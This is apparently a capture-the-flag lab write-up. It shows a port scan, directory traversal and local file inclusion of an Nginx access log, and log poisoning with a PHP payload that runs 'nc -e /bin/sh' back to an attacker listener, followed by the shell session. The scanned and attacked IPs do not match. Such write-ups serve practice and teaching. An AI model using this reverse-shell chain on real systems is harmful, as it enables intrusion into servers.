## Description
```Description
This warmup machine focuses on teaching how to exploit the directory traversal vulnerability, which causes access to the file system on the server, and the LFI vulnerability, which causes the inclusion of local files in the web application.

It is recommended for practicing detecting and exploiting file upload, directory traversal and LFI vulnerabilities in web applications running on Nginx web server, and getting reverse shell using log poisoning.
```

## IP-Address
```IP-Address
172.20.2.69
```

## RustScan
```bash
rustscan -a 172.20.2.69 -b 450 -t 2000 --ulimit 5000 -- -e tun0 -Pn

PORT   STATE SERVICE REASON
80/tcp open  http    syn-ack ttl 63

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 13.29 seconds
           Raw packets sent: 1 (44B) | Rcvd: 1 (44B)
```

## Web Browser Machine
```burp
http://172.20.2.73/show-invoice.php?invoice=/../../../../var/log/nginx/access.log
```
we Access Log file and control so after this we try to inject rev shell code using netcat 
```bash
nc 172.20.2.73 80
GET /<?php passthru('nc -e /bin/sh 10.8.33.208 1337'); ?> HTTP/1.1
Host: 172.20.2.73  
Connection: close
```
And then visit the Burp Again With
```burp
http://172.20.2.73/show-invoice.php?invoice=/../../../../var/log/nginx/access.log
```
And Got the shell
```bash
nc -lvnp 1337
listening on [any] 1337 ...
connect to [10.8.33.208] from (UNKNOWN) [172.20.2.73] 52224
pwd
/var/www/html
cd..
cd..
ls
css
fonts
index.php
invoice.php
invoices
js
show-invoice.php
style.css
pwd
/var/www/html
ls -l /var/www/html/invoice.php
-rw-r--r-- 1 root root 13075 Feb  1  2024 /var/www/html/invoice.php
stat invoice.php
  File: invoice.php
  Size: 13075           Blocks: 32         IO Block: 4096   regular file
Device: 801h/2049d      Inode: 147324      Links: 1
Access: (0644/-rw-r--r--)  Uid: (    0/    root)   Gid: (    0/    root)
Access: 2024-02-01 02:30:26.210757598 -0500
Modify: 2024-02-01 02:30:26.178756563 -0500
Change: 2024-02-01 02:30:26.178756563 -0500
 Birth: 2023-09-28 03:45:43.894738757 -0400
stat show-invoice
stat show-invoice.php
  File: show-invoice.php
  Size: 65              Blocks: 8          IO Block: 4096   regular file
Device: 801h/2049d      Inode: 147445      Links: 1
Access: (0644/-rw-r--r--)  Uid: (    0/    root)   Gid: (    0/    root)
Access: 2025-07-20 02:43:58.100000000 -0400
Modify: 2023-12-10 19:23:00.000000000 -0500
Change: 2023-12-24 11:16:23.980000000 -0500
 Birth: 2023-09-28 03:45:45.478746291 -0400
```

# END